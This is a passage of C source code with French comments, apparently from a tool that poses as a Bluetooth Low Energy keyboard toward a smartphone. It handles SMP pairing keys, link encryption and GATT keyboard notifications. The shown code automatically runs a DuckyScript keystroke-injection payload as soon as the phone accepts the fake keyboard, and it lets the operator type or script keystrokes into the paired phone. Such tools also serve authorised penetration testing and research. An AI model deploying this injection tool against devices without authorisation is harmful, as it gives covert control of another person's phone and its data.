                            printf("  %sAstuce : Tapez du texte ici et appuyez sur [Entrée] pour l'écrire sur le téléphone !%s\n", UI_PURPLE, UI_RESET);
                            printf("  %sAstuce : Tapez '/d [fichier.ducky]' pour exécuter un script DuckyScript.%s\n\n> ", UI_PURPLE, UI_RESET);
                            fflush(stdout);
                        }
                    } else if (sub == 0x05) { // HCI_LE_EV_LTK_REQUEST (Demande de clé STK/LTK par le contrôleur)
                        uint16_t req_handle = (uint16_t)(buf[4] | (buf[5] << 8));
                        // LE LTK Request contient aussi EDIV (2 octets) et Rand (8 octets)
                        uint16_t req_ediv = 0;
                        uint8_t req_rand[8] = {0};
                        if (n >= 18) {
                            // buf[6..13] = Random Number (8 octets), buf[14..15] = EDIV (2 octets)
                            memcpy(req_rand, &buf[6], 8);
                            req_ediv = (uint16_t)(buf[14] | (buf[15] << 8));
                        }

                        printf("  %s[*] Reçu HCI LE LTK Request (Handle=0x%04x, EDIV=0x%04x)...%s\n",
                               UI_PURPLE, req_handle, req_ediv, UI_RESET);

                        // Cas 1 : Premier pairing — EDIV=0, Rand=0 → fournir le STK
                        if (g_smp_session.stk_ready && req_ediv == 0) {
                            uint8_t ltk_reply[18];
                            ltk_reply[0] = (uint8_t)(req_handle & 0xff);
                            ltk_reply[1] = (uint8_t)(req_handle >> 8);
                            memcpy(&ltk_reply[2], g_smp_session.stk, 16);
                            hci_send_cmd(fd, 0x201a, ltk_reply, 18);
                            printf("  %s[+] STK fourni au contrôleur -> Activation du chiffrement matériel Link Layer !%s\n", UI_GREEN, UI_RESET);
                        }
                        // Cas 2 : Reconnexion — EDIV/Rand correspondent à notre LTK distribué
                        else if (req_ediv == g_smp_session.ediv &&
                                 memcmp(req_rand, g_smp_session.rand_val, 8) == 0 &&
                                 g_smp_session.ltk[0] != 0) {
                            uint8_t ltk_reply[18];
                            ltk_reply[0] = (uint8_t)(req_handle & 0xff);
                            ltk_reply[1] = (uint8_t)(req_handle >> 8);
                            memcpy(&ltk_reply[2], g_smp_session.ltk, 16);
                            hci_send_cmd(fd, 0x201a, ltk_reply, 18);
                            printf("  %s[+] LTK (bonding) fourni au contrôleur -> Reconnexion chiffrée !%s\n", UI_GREEN, UI_RESET);
                        } else {
                            uint8_t ltk_neg[2];
                            ltk_neg[0] = (uint8_t)(req_handle & 0xff);
                            ltk_neg[1] = (uint8_t)(req_handle >> 8);
                            hci_send_cmd(fd, 0x201b, ltk_neg, 2);
                            printf("  %s[-] Aucun LTK correspondant (EDIV mismatch), rejet.%s\n", UI_ORANGE, UI_RESET);
                        }
                    }
                } else if (evt_code == 0x08 && n >= 6) { // HCI_EV_ENCRYPT_CHANGE
                    uint8_t enc_status = buf[2];
                    uint16_t enc_handle = (uint16_t)(buf[3] | (buf[4] << 8));
                    uint8_t enc_enabled = buf[5];
                    if (enc_status == 0x00 && enc_enabled != 0x00) {
                        g_smp_session.encrypted = true;
                        printf("\n  %s============================================================%s\n", UI_GREEN, UI_RESET);
                        printf("  %s%s[+] Chiffrement Link Layer activé avec succès (AES-128 CCM) !%s (Handle = 0x%04x)\n",
                               UI_GREEN, UI_BOLD, UI_RESET, enc_handle);
                        printf("  %s============================================================%s\n", UI_GREEN, UI_RESET);
                        fflush(stdout);

                        // Distribuer les clés Phase 3 (LTK) maintenant que le lien est chiffré
                        // Attendre d'abord que le smartphone ait envoyé ses clés (délai court)
                        usleep(200000); // 200ms pour laisser le smartphone envoyer ses clés Phase 3
                        smp_distribute_keys_phase3(fd, enc_handle);
                    }
                } else if (evt_code == HCI_EV_DISCONN_COMPL && n >= 6) {
                    uint16_t d_handle = (uint16_t)(buf[4] | (buf[5] << 8));
                    if (d_handle == active_conn_handle) {
                        is_connected = false;
                        active_conn_handle = 0;
                        printf("\n  %s[-] Smartphone déconnecté (Raison: 0x%02x). Ré-armement des annonces...%s\n\n> ",
                               UI_ORANGE, buf[6], UI_RESET);
                        fflush(stdout);
                        // Réactiver les annonces
                        uint8_t adv_on = 0x01;
                        hci_send_cmd(fd, 0x200a, &adv_on, 1);
                    }
                }
            }

            // 2. Paquets de données ACL (ATT / SMP)
            else if (pkt_type == HCI_ACLDATA_PKT && n >= 9) {
                uint16_t l2cap_len = (uint16_t)(buf[5] | (buf[6] << 8));
                uint16_t l2cap_cid = (uint16_t)(buf[7] | (buf[8] << 8));
                const uint8_t *l2payload = &buf[9];
                size_t payload_len = (size_t)(n - 9);
                if (payload_len > l2cap_len) payload_len = l2cap_len;

                // Canal SMP (Security Manager Protocol) - CID 0x0006
                if (l2cap_cid == SMP_CID_VAL && payload_len > 0) {
                    uint8_t smp_rsp[64];
                    int rlen = smp_server_handle_packet(active_conn_handle, l2payload, payload_len,
                                                        smp_rsp, sizeof(smp_rsp), cfg, &stats);
                    if (rlen > 0) {
                        send_l2cap_packet(fd, active_conn_handle, SMP_CID_VAL, smp_rsp, (uint16_t)rlen);
                    }
                }

                // Canal ATT (Attribute Protocol / GATT) - CID 0x0004
                else if (l2cap_cid == ATT_CID_VAL && payload_len > 0) {
                    stats.att_requests_count++;
                    uint8_t att_rsp[512];
                    bool notif_changed = stats.notifications_enabled;
                    int rlen = gatt_server_handle_att_packet(active_conn_handle, l2payload, payload_len,
                                                            att_rsp, sizeof(att_rsp), dev_name,
                                                            &notif_changed);
                    if (notif_changed != stats.notifications_enabled) {
                        stats.notifications_enabled = notif_changed;
                        if (stats.notifications_enabled) {
                            printf("  %s[GATT]%s Le smartphone a activé les notifications clavier (CCCD = 0x0001) ! Le clavier est prêt.%s\n> ",
                                   UI_GREEN, UI_BOLD, UI_RESET);
                            fflush(stdout);

                            // Si un payload Ducky automatique était spécifié
                            if (cfg && cfg->payload_file) {
                                FILE *fp = fopen(cfg->payload_file, "r");
                                if (fp) {
                                    printf("\n  [*] Exécution automatique du payload '%s'...\n", cfg->payload_file);
                                    struct ducky_ble_ctx dctx = { .fd = fd, .conn_handle = active_conn_handle };
                                    ducky_run(fp, ducky_ble_sink, &dctx);
                                    fclose(fp);
                                    printf("  %s[+] Payload automatique terminé !%s\n> ", UI_GREEN, UI_RESET);
                                    fflush(stdout);
                                }
                            }
                        }
                    }

                    if (rlen > 0) {
                        send_l2cap_packet(fd, active_conn_handle, ATT_CID_VAL, att_rsp, (uint16_t)rlen);
                    }
                }
            }
        }
    }

    // Arrêt propre
    printf("\n  [*] Arrêt du périphérique Clavier BLE...\n");
    adv_off = 0x00;
    hci_send_cmd(fd, 0x200a, &adv_off, 1);
    usleep(20000);

    close(fd);
    set_adapter_power_mgmt(dev_id, 1);
    printf("  %s[+] Adaptateur hci%d réinitialisé et libéré.%s\n", UI_GREEN, dev_id, UI_RESET);
    return 0;
}
